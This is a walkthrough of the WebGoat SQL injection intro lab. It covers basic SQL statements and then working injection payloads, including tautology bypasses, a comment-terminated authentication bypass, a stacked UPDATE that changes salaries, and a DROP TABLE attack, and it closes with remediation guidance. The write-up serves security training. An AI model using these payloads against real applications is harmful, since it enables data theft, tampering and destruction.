# SQL Injection (intro) — WebGoat Lesson: A3 Injection

**Category:** A3 — Injection  
**Difficulty:** Medium

## Objective

This is a multi-part lesson covering SQL fundamentals and demonstrating how unsafe construction of SQL statements can allow an attacker to manipulate database queries. The exercises progress from basic SQL operations through DML, DDL, and DCL statements, and then demonstrate how SQL injection can compromise the confidentiality, integrity, and availability of database data.

## Vulnerability

The core vulnerability is the construction of SQL statements using untrusted input without proper parameterization or prepared statements. When attacker-controlled input is concatenated directly into a SQL statement, SQL metacharacters can change the structure and meaning of the original query.

The lesson demonstrates several consequences of this weakness:

- **Confidentiality:** injected conditions can return records that should not be accessible.
- **Integrity:** stacked SQL statements can modify database records.
- **Availability:** destructive statements can remove database objects and make data unavailable.

The introductory exercises also demonstrate the three broad SQL command categories used throughout the lesson: Data Manipulation Language (DML), Data Definition Language (DDL), and Data Control Language (DCL).

## Task 1 — Basic SQL Query

**Task:** Retrieve the department of the employee Bob Franco from the `employees` table.

![SQL Injection lesson introduction](../assets/a3-injection/sql-injection(intro)/01-sql-intro.png)

The lesson provides an `employees` table containing fields such as `userid`, `first_name`, `last_name`, `department`, `salary`, and `auth_tan`. The assignment asks for Bob Franco's department.

A `SELECT` statement can retrieve the required value by filtering on the employee's last name:

```sql
SELECT department FROM employees WHERE last_name = 'Franco';
```

![Basic SELECT query completed](../assets/a3-injection/sql-injection(intro)/02-task-1-select-correct.png)

The query returned **Marketing**, and WebGoat confirmed that the assignment was successfully completed.

## Task 3 — Data Manipulation Language (DML)

**Task:** Change Tobi Barnett's department to `Sales`.

DML statements operate on the data stored in database tables. Common DML statements include `SELECT`, `INSERT`, `UPDATE`, and `DELETE`.

The required modification can be performed with an `UPDATE` statement:

```sql
UPDATE employees SET department = 'Sales' WHERE last_name = 'Barnett';
```

![DML UPDATE query completed](../assets/a3-injection/sql-injection(intro)/03-task-3-dml-update.png)

The result shows Tobi Barnett's department changed from **Development** to **Sales**, and WebGoat confirmed successful completion.

## Task 4 — Data Definition Language (DDL)

**Task:** Modify the `employees` table schema by adding a `phone` column of type `varchar(20)`.

DDL statements define and modify the structure of database objects. Common DDL statements include `CREATE`, `ALTER`, and `DROP`.

The required schema modification is:

```sql
ALTER TABLE employees ADD phone varchar(20);
```

![DDL ALTER TABLE query completed](../assets/a3-injection/sql-injection(intro)/04-task-4-ddl-alter.png)

The `ALTER TABLE` statement successfully added the `phone` column to the `employees` table.

## Task 5 — Data Control Language (DCL)

**Task:** Grant all privileges on the `grant_rights` table to `unauthorized_user`.

DCL statements control access privileges on database objects. The two commonly used DCL statements are `GRANT` and `REVOKE`.

The required `GRANT` statement is:

```sql
GRANT ALL PRIVILEGES ON grant_rights TO unauthorized_user
```

![DCL GRANT query completed](../assets/a3-injection/sql-injection(intro)/05-task-5-dcl-grant.png)

WebGoat confirmed that the statement successfully completed the assignment. In a real application, allowing an unauthorized principal to receive unrestricted database privileges would represent a serious access-control failure.

## Task 9 — String SQL Injection

**Task:** Retrieve all users from the `user_data` table without knowing a specific username.

The lesson explains that the application constructs a SQL statement by concatenating a user-controlled string:

```sql
SELECT * FROM user_data WHERE first_name = 'John' AND last_name = '' + lastName + '';
```

Because the supplied value is inserted directly into a quoted SQL expression, an attacker can use a quote to terminate the intended string and inject an additional Boolean expression.

The successful payload demonstrated in the exercise is:

```text
' or '1'='1
```

This changes the logical condition so that the predicate evaluates to true for the returned rows. The resulting query is effectively equivalent to:

```sql
SELECT * FROM user_data WHERE (first_name = 'John' AND last_name = '') OR ('1' = '1')
```

![String SQL injection returning all user records](../assets/a3-injection/sql-injection(intro)/06-task-9-string-sqli.png)

The response contains multiple records from the `user_data` table rather than a single intended user. WebGoat also explains that the injected condition evaluates to `TRUE`, causing the query to return the available records.

## Task 10 — Numeric SQL Injection

**Task:** Retrieve all data from the `user_data` table using the numeric SQL injection exercise.

The lesson's vulnerable query concatenates numeric input directly into the SQL statement:

```sql
SELECT * FROM user_data WHERE login_count = ' + Login_Count + ' AND userid = ' + User_ID;
```

Only one of the two supplied fields is susceptible to SQL injection. The successful input shown in the exercise is:

```text
Login_Count: 0
User_Id: 0 OR 1 = 1
```

The application displays the resulting query as:

```sql
SELECT * FROM user_data WHERE login_count = 0 and userid= 0 OR 1=1
```

The lesson's demonstrated query structure can also be represented using its original example values as:

```sql
SELECT * FROM user_data WHERE login_count = 1 AND userid = 101 OR 1=1
```

The important point is that the numeric value is concatenated into the SQL statement without being safely parameterized. The injected `OR 1=1` introduces a condition that evaluates to true.

![Numeric SQL injection returning all user records](../assets/a3-injection/sql-injection(intro)/07-task-10-numeric-sqli.png)

The application returned the complete set of displayed user records, confirming that the numeric SQL injection was successful.

## Task 11 — Compromising Confidentiality with String SQL Injection

**Task:** Retrieve employee data that the current employee should not be able to access.

This exercise demonstrates the confidentiality impact of SQL injection. The application constructs the query by concatenating both the employee name and authentication TAN into the SQL statement:

```sql
SELECT * FROM employees WHERE last_name = '' + name + '' AND auth_tan = '' + auth_tan + '';
```

The successful payload entered into the **Employee Name** field was:

```text
Smith' OR 1=1;--
```

The authentication-TAN field was left unchanged.

The injected quote terminates the original string value. `OR 1=1` adds a condition that evaluates to true, while `--` comments out the remainder of the original query, including the authentication-TAN condition.

The resulting SQL is effectively:

```sql
SELECT * FROM employees WHERE last_name = 'Smith' OR 1=1;--' AND auth_tan = '3SL99A'
```

![String SQL injection compromising confidentiality](../assets/a3-injection/sql-injection(intro)/08-task-11-confidentiality.png)

The application returned employee records from the table and explicitly confirmed that the confidentiality of the data had been compromised.

This demonstrates why SQL injection is an authorization and data-confidentiality concern in addition to being a database parsing problem: an attacker can manipulate the application's query so that authentication or filtering conditions are no longer enforced.

## Task 12 — Compromising Integrity with SQL Query Chaining

**Task:** Modify salary information by chaining an additional SQL statement onto the original query.

SQL query chaining, also called stacked queries, attempts to append another SQL statement to the original statement. The semicolon (`;`) is used to terminate one SQL statement and begin another when the underlying database and application configuration permit multiple statements.

The vulnerable query structure is:

```sql
SELECT * FROM employees WHERE last_name = '' + name + '' AND auth_tan = '' + auth_tan + '';
```

The successful input demonstrated in the exercise begins with a condition that closes the original value and then appends an `UPDATE` statement. The resulting SQL is effectively:

```sql
SELECT * FROM employees WHERE last_name = 'Smith' OR 1=1;
UPDATE employees SET SALARY = 1000000 WHERE last_name = 'Smith';
--' AND auth_tan = '3SL99A'
```

![SQL query chaining compromising integrity](../assets/a3-injection/sql-injection(intro)/09-task-12-query-chaining.png)

The additional `UPDATE` statement changed John Smith's salary to **1,000,000**. WebGoat confirmed both that the salary was changed and that the integrity of the database had been compromised.

The key security issue is that the application allowed attacker-controlled input to escape the intended SQL value and introduce an additional database operation.

## Task 13 — Compromising Availability

**Task:** Delete the `access_log` table by injecting a destructive SQL statement into the log-search functionality.

This final exercise demonstrates the availability impact of SQL injection. If an attacker can inject DDL statements such as `DROP TABLE`, they may be able to destroy database objects and make application data or functionality unavailable.

The successful input shown in the **Action contains** field was:

```text
'; DROP TABLE access_log ;
```

The resulting SQL is effectively structured as:

```sql
SELECT * FROM employees WHERE last_name = ''; DROP TABLE access_log ;--
```

The important parts of the payload are:

- `'` — terminates the original SQL string.
- `;` — terminates the original statement and begins another SQL statement.
- `DROP TABLE access_log` — deletes the `access_log` table.
- `--` — comments out the remainder of the original SQL, preventing it from interfering with the injected statement.

![DROP TABLE SQL injection compromising availability](../assets/a3-injection/sql-injection(intro)/10-task-13-availability.png)

WebGoat confirmed that the `access_log` table was successfully deleted and explicitly identified this as a compromise of data availability.

## Why It Worked

The exercises succeed because the application treats user-controlled input as part of the SQL program instead of treating it strictly as data.

- **Direct SQL execution:** The introductory tasks demonstrate how SQL statements can directly retrieve, modify, define, and control database objects.
- **String SQL injection:** Quotes allow attacker-controlled input to escape the intended string literal and introduce new SQL syntax.
- **Numeric SQL injection:** Numeric parameters are also unsafe when concatenated directly into a query. The absence of quotes does not make concatenation safe.
- **Boolean manipulation:** Expressions such as `OR 1=1` can make a predicate evaluate to true and bypass intended filtering conditions.
- **Comment termination:** `--` can neutralize the remainder of a vulnerable SQL statement, allowing the injected logic to stand on its own.
- **Query chaining:** A semicolon can separate the original statement from an attacker-controlled second statement when stacked queries are supported.
- **CIA impact:** The same underlying injection weakness can expose information (**confidentiality**), alter records (**integrity**), or delete database objects (**availability**).

The root cause is not the specific payload. It is the application's construction of SQL using untrusted input without a safe parameterization boundary.

## Remediation

- Use **parameterized queries / prepared statements** for all SQL statements that incorporate user-controlled data.
- Never construct SQL by concatenating request parameters, form fields, cookies, headers, or other untrusted input into a query string.
- Use the database access layer's parameter-binding mechanism rather than manually escaping quotes.
- Apply **least privilege** to application database accounts. The application account should not have unnecessary DDL or administrative privileges such as `DROP TABLE` or unrestricted `GRANT` capabilities.
- Enforce server-side authorization independently of SQL query filters. A query should not be responsible for determining whether a user is allowed to access another user's data.
- Validate input according to its expected type and format as a defense-in-depth measure. Input validation should supplement, not replace, parameterized queries.
- Disable or restrict stacked-query execution where the database driver/application does not require it.
- Log and monitor suspicious database activity, including repeated SQL syntax errors, unexpected query patterns, and attempts to inject SQL metacharacters.

## References

- [OWASP Top 10 2021 — A03: Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)
